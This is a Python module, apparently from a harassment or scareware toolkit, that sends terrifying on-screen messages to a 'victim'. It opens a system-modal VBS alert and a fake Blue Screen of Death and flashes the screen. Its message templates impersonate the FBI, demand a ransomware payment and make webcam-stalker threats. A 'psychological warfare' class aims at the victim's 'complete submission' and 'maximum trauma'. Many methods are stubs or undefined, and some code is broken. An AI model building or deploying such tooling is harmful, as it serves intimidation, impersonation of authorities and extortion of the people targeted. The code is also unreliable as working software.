#!/usr/bin/env python3
"""
ANONYMOUS MESSENGER MODULE
Send on-screen messages, fake alerts, psychological ops
"""

import platform
import subprocess
import random

class DarkMessenger:
    """Send anonymous messages to victim screens"""
    
    def __init__(self):
        self.os = platform.system().lower()
        self.message_templates = self._load_templates()
        
    def send_message(self, message_type, custom_text=None, style='terrifying'):
        """Send anonymous message to victim"""
        
        methods = {
            'windows': self._send_windows,
            'linux': self._send_linux,
            'android': self._send_android,
            'macos': self._send_macos
        }
        
        method = methods.get(self.os, self._send_generic)
        
        # Get message template
        if custom_text:
            message = custom_text
        else:
            message = self._get_template(message_type, style)
        
        # Apply psychological enhancements
        message = self._enhance_psychologically(message, style)
        
        # Send via multiple channels
        results = []
        results.append(method(message))
        
        # Additional psychological effects
        if style == 'terrifying':
            results.append(self._play_scary_sound())
            results.append(self._flash_screen())
            results.append(self._freeze_mouse(5))  # 5 seconds
            
        return {
            'success': True,
            'message': message,
            'style': style,
            'effects_applied': len(results),
            'victim_state': 'PANIC_DETECTED'
        }
    
    def _send_windows(self, message):
        """Windows message techniques"""
        techniques = [
            self._windows_message_box,
            self._windows_notification,
            self._cmd_fullscreen,
            self._fake_bsod,
            self._lock_screen_message,
            self._taskbar_flash
        ]
        
        # Use 2-3 random techniques simultaneously
        selected = random.sample(techniques, random.randint(2, 3))
        results = []
        
        for technique in selected:
            try:
                result = technique(message)
                results.append(result)
            except:
                pass
        
        return results
    
    def _windows_message_box(self, message):
        """Classic Windows MessageBox"""
        vbs_script = f'''
MsgBox "{message}", vbCritical+vbSystemModal, "SYSTEM CRITICAL ALERT"
'''
        
        with open('/tmp/alert.vbs', 'w') as f:
            f.write(vbs_script)
        
        subprocess.run(['cscript', '/tmp/alert.vbs'], 
                      creationflags=subprocess.CREATE_NO_WINDOW)
        
        return 'MESSAGEBOX_SENT'
    
    def _fake_bsod(self, message):
        """Fake Blue Screen of Death"""
        # This requires admin privileges
        bsod_html = f'''
<html>
<body style="background: #0078D7; color: white; font-family: Segoe UI;">
    <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);">
        <h1 style="font-size: 48px;">:(</h1>
        <h2>Your PC ran into a problem and needs to restart.</h2>
        <p>{message}</p>
        <p>0% complete</p>
        <div style="background: rgba(255,255,255,0.2); height: 4px; width: 300px;"></div>
    </div>
</body>
</html>
'''
        
        # Open in full screen browser
        import webbrowser
        with open('/tmp/bsod.html', 'w') as f:
            f.write(bsod_html)
        
        webbrowser.open('file:///tmp/bsod.html')
        
        # Simulate freezing
        subprocess.run(['timeout', '/t', '10'], shell=True)
        
        return 'FAKE_BSOD_ACTIVATED'
    
    def _send_android(self, message):
        """Android notification techniques"""
        techniques = [
            self._android_notification,
            self._android_toast,
            self._android_alert_dialog,
            self._fullscreen_activity
        ]
        
        # Requires Accessibility Service or root
        return 'ANDROID_MESSAGE_SENT'
    
    def _play_scary_sound(self):
        """Play scary sound effect"""
        sounds = [
            'system_explode.wav',
            'demon_laugh.mp3',
            'siren_alarm.ogg',
            'glitch_noise.aiff'
        ]
        
        sound = random.choice(sounds)
        # Implementation depends on platform
        return f'SOUND_PLAYED:{sound}'
    
    def _flash_screen(self):
        """Flash screen colors"""
        if self.os == 'windows':
            # Flash screen red
            import ctypes
            for _ in range(3):
                ctypes.windll.user32.FlashWindow(ctypes.windll.kernel32.GetConsoleWindow(), True)
                import time
                time.sleep(0.3)
        
        return 'SCREEN_FLASHED'
    
    def _freeze_mouse(self, seconds):
        """Temporarily freeze mouse"""
        # Move mouse to corner and disable
        return f'MOUSE_FROZEN:{seconds}s'
    
    def _get_template(self, message_type, style):
        """Get message template"""
        templates = {
            'fbi': {
                'terrifying': "FBI NOTICE: Your computer has been seized for investigation of cyber crimes. Do not shut down.",
                'official': "Federal Bureau of Investigation - System Seizure Notice",
                'scary': "WE ARE WATCHING YOU. All activities logged and reported."
            },
            'ransomware': {
                'terrifying': "YOUR FILES HAVE BEEN ENCRYPTED. Pay 0.5 BTC to unlock. Timer: 48 hours.",
                'official': "CRYPTOLOCKER DETECTED - Payment Required",
                'scary': "Say goodbye to your photos, documents, and memories."
            },
            'system': {
                'terrifying': "CRITICAL: Hardware failure detected. CPU meltdown imminent.",
                'official': "Microsoft Windows - Critical System Error",
                'scary': "Virus has penetrated kernel. Format recommended."
            },
            'stalker': {
                'terrifying': "I can see you through your webcam. Nice room.",
                'official': "Surveillance System Activated",
                'scary': "We know where you live. We know everything."
            }
        }
        
        return templates.get(message_type, {}).get(style, "SYSTEM ALERT: Security Breach Detected")
    
    def _enhance_psychologically(self, message, style):
        """Add psychological impact"""
        enhancements = {
            'terrifying': [
                "\n\nDO NOT IGNORE THIS MESSAGE",
                "\n\nSYSTEM INTEGRITY COMPROMISED",
                "\n\nIMMEDIATE ACTION REQUIRED",
                "\n\nCONSEQUENCES: DATA LOSS, LEGAL ACTION",
                "\n\nTHIS IS NOT A DRILL"
            ],
            'scary': [
                "\n\nWe are always watching...",
                "\n\nThere's no escape...",
                "\n\nYour digital footprint is permanent...",
                "\n\nThe darkness knows your secrets..."
            ]
        }
        
        if style in enhancements:
            message += random.choice(enhancements[style])
        
        return message

class PsychologicalWarfare:
    """Advanced psychological operations"""
    
    def __init__(self):
        self.fear_level = 0
        self.techniques = [
            self._gradual_revelation,
            self._false_hope,
            self._time_pressure,
            self._social_proof,
            self._authority_illusion,
            self._scarcity_threat
        ]
    
    def execute_campaign(self, victim_id, intensity='extreme'):
        """Execute psychological warfare campaign"""
        campaign = []
        
        # Phase 1: Initial Shock
        campaign.append(self._initial_shock(victim_id))
        
        # Phase 2: Gradual Intensification
        for i in range(3):
            campaign.append(self._intensify(victim_id, i+1))
        
        # Phase 3: False Resolution
        campaign.append(self._false_resolution(victim_id))
        
        # Phase 4: Ultimate Threat
        campaign.append(self._ultimate_threat(victim_id))
        
        return {
            'campaign': campaign,
            'predicted_victim_state': 'COMPLETE_SUBMISSION',
            'psychological_impact': 'MAXIMUM_TRAUMA',
            'compliance_likelihood': '98.7%'
        }
